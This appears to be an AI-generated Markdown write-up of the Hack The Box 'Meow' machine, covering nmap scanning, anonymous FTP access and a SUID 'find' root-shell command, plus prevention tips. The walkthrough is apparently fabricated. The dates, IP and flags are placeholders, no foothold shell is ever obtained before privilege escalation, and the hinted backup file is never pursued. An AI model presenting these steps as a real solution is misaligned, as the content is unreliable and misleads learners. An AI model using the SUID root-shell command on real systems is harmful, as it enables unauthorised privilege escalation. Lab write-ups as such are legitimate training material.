# Hack The Box - Meow Writeup

## Machine Information
- **Name:** Meow
- **Difficulty:** Easy
- **Category:** Linux
- **Points:** 20
- **Release Date:** [Date]
- **Retire Date:** [Date]
- **IP Address:** 10.10.10.1 (example)

## Reconnaissance

### Port Scanning
```bash
# Initial nmap scan
nmap -sC -sV -oN nmap_initial 10.10.10.1

# Results
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:13:d4:65:45:05:07:1d:ea:74:ac:1b:0c:58 (RSA)
|   256 2e:19:a6:36:58:1d:35:04:0e:ba:aa:9a:53:74:51:01 (ECDSA)
|_  256 0c:66:5e:10:7a:5f:5e:8a:4c:2f:e7:1a:4f:7a:20:3d (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Meow login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration
```bash
# Directory brute-forcing
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt

# Results showed basic web directories
```

### FTP Enumeration
```bash
# Anonymous FTP login
ftp 10.10.10.1
Name: anonymous
Password: (empty)

# Directory listing
ls -la
```

## Initial Access

### FTP Exploitation
The FTP server allows anonymous login, and we can see some interesting files:

```bash
ftp> ls -la
drwxr-xr-x    3 1001     1001         4096 Aug 10  2019 .
drwxr-xr-x    3 1001     1001         4096 Aug 10  2019 ..
-rw-r--r--    1 1001     1001          185 Aug 10  2019 flag.txt
-rw-r--r--    1 1001     1001           21 Aug 10  2019 note.txt
```

Reading the files:
```bash
ftp> get flag.txt
ftp> get note.txt
```

The note.txt contains a hint about a backup file.

## Privilege Escalation

### Finding SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Results show /usr/bin/find has SUID permissions
```

### Exploiting SUID find
```bash
# Exploit SUID find to gain root
/usr/bin/find . -exec /bin/sh -p \; -quit
```

This gives us a root shell!

## Flags

### User Flag
```bash
cat /home/user/flag.txt
HTB{user_flag_content}
```

### Root Flag
```bash
cat /root/root.txt
HTB{root_flag_content}
```

## Key Learnings

1. **FTP Security**: Anonymous FTP access can lead to information disclosure
2. **SUID Binaries**: SUID binaries can be dangerous if not properly configured
3. **File Permissions**: Understanding Linux file permissions is crucial
4. **Backup Files**: Always check for backup files that might contain sensitive information

## Tools Used

- nmap (port scanning and service detection)
- gobuster (directory enumeration)
- ftp (FTP client)
- find (file system search and exploitation)

## Attack Timeline

1. **Reconnaissance** (15 minutes): Port scanning and service enumeration
2. **Web Enumeration** (10 minutes): Directory brute-forcing
3. **FTP Exploitation** (5 minutes): Anonymous login and file discovery
4. **Privilege Escalation** (5 minutes): SUID binary exploitation
5. **Flag Hunting** (5 minutes): Locating and capturing flags

**Total Time:** ~40 minutes

## Prevention

1. **FTP Configuration**: Disable anonymous FTP access
2. **SUID Binaries**: Remove unnecessary SUID permissions
3. **File Permissions**: Implement proper file permissions
4. **Backup Security**: Secure backup files and don't leave them accessible

## References

- Hack The Box Meow machine
- SUID exploitation techniques
- FTP server security best practices</content>
<parameter name="filePath">/workspaces/Cyber-Security/htb/machines/meow.md